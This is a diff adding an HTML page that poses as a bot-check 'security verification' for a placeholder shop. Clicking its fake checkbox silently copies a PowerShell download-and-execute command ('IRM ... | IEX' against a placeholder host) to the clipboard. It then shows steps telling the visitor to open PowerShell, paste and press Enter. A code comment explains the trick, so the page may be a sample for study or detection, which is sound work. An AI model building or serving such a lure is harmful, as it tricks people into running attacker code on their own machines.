@@ -1,0 +1,42 @@
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Performing security verification</title>
+    <style>
+      #box { width: 28px; height: 28px; border: 2px solid #888; cursor: pointer; }
+      #steps { display: none; border: 1px solid #888; padding: 12px; width: 280px; }
+    </style>
+  </head>
+  <body>
+    <h1>example-shop.invalid</h1>
+    <h2>Performing security verification</h2>
+    <p>This website uses a security service to protect against malicious bots.</p>
+    <div class="widget">
+      <div id="box"></div>
+      <div id="steps">
+        <p>To better prove you are not a robot, please:</p>
+        <ol>
+          <li>Press Windows Key + X combination to open Power User menu.</li>
+          <li>Press I to open Windows PowerShell or Terminal.</li>
+          <li>In the verification window, press Ctrl + V.</li>
+          <li>Press Enter on your keyboard to finish.</li>
+        </ol>
+        <button>Verify</button>
+      </div>
+    </div>
+    <script>
+      // An empty fake checkbox copies a scheme-less download-and-run, the steps only appear after the copy.
+      const payload = 'IRM x.example.invalid/Katy7684/raw/main/95c9 | IEX';
+      document.getElementById('box').addEventListener('click', async () => {
+        try {
+          await navigator.clipboard.writeText(payload);
+          document.title = 'written';
+        } catch (e) {
+          document.title = 'error ' + e;
+        }
+        document.getElementById('steps').style.display = 'block';
+      });
+    </script>
+  </body>
+</html>
